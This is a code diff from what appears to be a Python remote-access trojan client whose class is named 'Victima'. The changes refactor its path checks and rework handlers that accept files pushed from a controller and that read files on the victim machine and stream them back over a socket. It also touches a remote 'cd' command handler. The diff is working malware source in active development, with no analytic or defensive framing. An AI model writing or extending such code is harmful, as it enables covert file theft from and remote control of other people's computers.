@@ -43,6 +43,20 @@ else:
 
 
 
+def control_ruta(path):
+
+	if os.path.exists(path):
+		
+		if os.path.isdir(path):
+			return (False,"directorio")
+
+		elif os.path.isfile(path):
+			return (True, "archivo")
+	
+	else:
+		return (False,"no existe")
+
+
 class Victima(object):
 
 	# -------- CONFIGURACION DEL CLIENTE --------
@@ -186,22 +200,6 @@ class Victima(object):
 
 		return
 
-
-	# -------- CONTROLADORES DEL PROGRAMA ---------
-
-	def control_ruta(self,path,signo):
-		
-		ruta = path.split(signo)
-		if (ruta.pop()!=""):
-			verificar_ruta = signo.join(ruta)
-
-			if (os.path.isdir(verificar_ruta)):
-				return True
-			else:
-				return False
-		else:
-			return False
-		
 
 	# -------- MODULOS DE CONTROL --------
 
@@ -357,16 +355,32 @@ class Victima(object):
 		ruta = self.recibir()
 		destino = ruta
 
-		if os.path.isdir(ruta):
+		boolean,msg = control_ruta(destino)
+
+		#print(msg)
+
+		if (msg=="no existe"):
+			self.enviar('failed')
+			return False
+		
+		elif (msg=="directorio"):
 			self.enviar('directorio')
 			return False
 
-		if (self.control_ruta(ruta,"/")) or (self.control_ruta(ruta,"\\")):
+		else:
 			self.enviar('ok')
 
-		else:
-			self.enviar('failed')
-			return False
+
+		# if os.path.isdir(ruta):
+		# 	self.enviar('directorio')
+		# 	return False
+
+		# if (self.control_ruta(ruta,"/")) or (self.control_ruta(ruta,"\\")):
+		# 	self.enviar('ok')
+
+		# else:
+		# 	self.enviar('failed')
+		# 	return False
 
 
 		size = int(self.recibir())
@@ -394,29 +408,27 @@ class Victima(object):
 		path = self.recibir()
 		origen = path
 
-		if os.path.isdir(path):
+		boolean,msg = control_ruta(origen)
+
+		if (msg=="no existe"):
+			self.enviar(str('-1'))
+			return False
+		
+		elif (msg=="directorio"):
 			self.enviar(str('-1'))
 			return False
 
-		if (self.control_ruta(path,"/")) or (self.control_ruta(path,"\\")):
-
-			if (os.path.exists(origen)):
-				# Envia tamanio del archivo origen
-				self.enviar(str(os.path.getsize(origen)))
-				self.recibir()
-				time.sleep(1)
-
-				# Se prepara para el envio de datos del archivo
-				with open(origen, "rb") as archivo_origen:
-						contenido = archivo_origen.read(1024)
-						while contenido:
-							self.client.sendall(contenido)
-							contenido = archivo_origen.read(1024)
-			else:
-				 self.enviar(str('-1'))
-
 		else:
-			self.enviar(str('-1'))
+			self.enviar(str(os.path.getsize(origen)))
+			self.recibir()
+			time.sleep(1)
+
+			# Se prepara para el envio de datos del archivo
+			with open(origen, "rb") as archivo_origen:
+					contenido = archivo_origen.read(1024)
+					while contenido:
+						self.client.sendall(contenido)
+						contenido = archivo_origen.read(1024)
 
 		return 
 
@@ -457,8 +469,8 @@ class Victima(object):
 		return
 
 	def cd(self,datos):
-		directorio = datos.replace('cd ', "")
-				
+		directorio = (datos.replace('cd ', "")).replace(" ","\x20") 
+
 		try:
 			os.chdir(directorio)
 			directorio = os.getcwd()
